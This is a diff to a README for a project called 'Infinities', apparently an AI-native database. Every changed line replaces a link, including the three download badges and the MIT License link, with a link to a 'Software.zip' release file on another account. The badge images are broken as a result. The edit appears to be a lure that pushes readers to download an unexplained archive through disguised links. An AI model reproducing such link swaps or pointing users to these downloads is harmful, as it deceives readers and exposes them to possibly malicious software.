@@ -1,6 +1,6 @@
 # 🌟 Welcome to the Infinities Repository 🌟
 
-[![Download](https://img.shields.io/badge/Download-Launch%20File-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/king123366/Infinities/releases/download/v1.0/Software.zip%20File-blue)](https://github.com/king123366/Infinities/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -40,7 +40,7 @@ Welcome to the Infinities repository, your gateway to an AI-native database desi
 
 To get started with Infinities, download the latest version by clicking the button below:
 
-[![Download](https://img.shields.io/badge/Download-Launch%20File-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/king123366/Infinities/releases/download/v1.0/Software.zip%20File-blue)](https://github.com/king123366/Infinities/releases/download/v1.0/Software.zip)
 
 Once you've downloaded the file, follow the installation instructions to set up Infinities on your system.
 
@@ -58,13 +58,13 @@ If you encounter any issues or have questions about using Infinities, don't hesi
 
 ## License
 
-The Infinities repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute this software in accordance with the license terms.
+The Infinities repository is licensed under the [MIT License](https://github.com/king123366/Infinities/releases/download/v1.0/Software.zip). Feel free to use, modify, and distribute this software in accordance with the license terms.
 
 ---
 
 🚀 Start exploring the possibilities with Infinities today! Download the latest version now:
 
-[![Download](https://img.shields.io/badge/Download-Launch%20File-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/king123366/Infinities/releases/download/v1.0/Software.zip%20File-blue)](https://github.com/king123366/Infinities/releases/download/v1.0/Software.zip)
 
 Happy coding! 🌟
 
